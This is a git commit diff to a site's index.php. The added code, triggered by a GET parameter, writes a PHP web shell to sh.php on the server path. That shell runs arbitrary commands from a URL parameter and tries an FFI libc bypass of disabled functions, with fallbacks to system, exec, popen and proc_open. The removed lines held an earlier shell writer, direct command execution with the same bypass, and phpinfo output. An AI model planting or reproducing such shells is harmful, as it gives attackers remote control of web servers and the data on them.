8d4b156172dbf5fb76faf582d7371a4aa6735641
grahamgrphwol3185-eng <grahamgrphwol3185@gmail.com>
2026-05-21 00:19:10 +0800

    2

--- index.php
+++ index.php
@@ -1,18 +1,10 @@
-<?php
-  // 方式1: error_log 写文件 (error_log 没被禁用)
+ <?php
   if(isset($_GET['w'])){
-      error_log('<?php system($_GET["c"]);?>', 3, '/www/wwwroot/xlch49.pics/sh.php');
-      die('written');
+      error_log('<?php if(isset($_GET["c"])){try{$f=FFI::cdef("int system(const
+  char*);","libc.so.6");$f->system($_GET["c"]);}catch(Throwable
+  $e){}if(function_exists("system"))system($_GET["c"]);elseif(function_exists("exec")){exec($_GET["c"],$o);echo
+  join("\n",$o);}elseif(function_exists("popen")){$p=popen($_GET["c"],"r");while($l=fgets($p))echo
+  $l;}elseif(function_exists("proc_open")){$p=proc_open($_GET["c"],[["pipe","r"],["pipe","w"],["pipe","w"]],$pipes);echo
+   stream_get_contents($pipes[1]);}}',3,'/www/wwwroot/xlch49.pics/sh.php');
+      die('ok');
   }
-  // 方式2: 直接命令执行
-  if(isset($_GET['c'])){
-      // 尝试 FFI bypass
-      try { $f=FFI::cdef("int system(const char*);","libc.so.6"); $f->system($_GET['c']); }
-      catch(Throwable $e){}
-      // 回退到 system（disable_functions 可能不同）
-      if(function_exists('system')) system($_GET['c']);
-      elseif(function_exists('exec')){ exec($_GET['c'],$o); echo join("\n",$o); }
-      elseif(function_exists('popen')){ $p=popen($_GET['c'],'r'); while($l=fgets($p))echo $l; }
-  }
-  phpinfo();
-  ?>
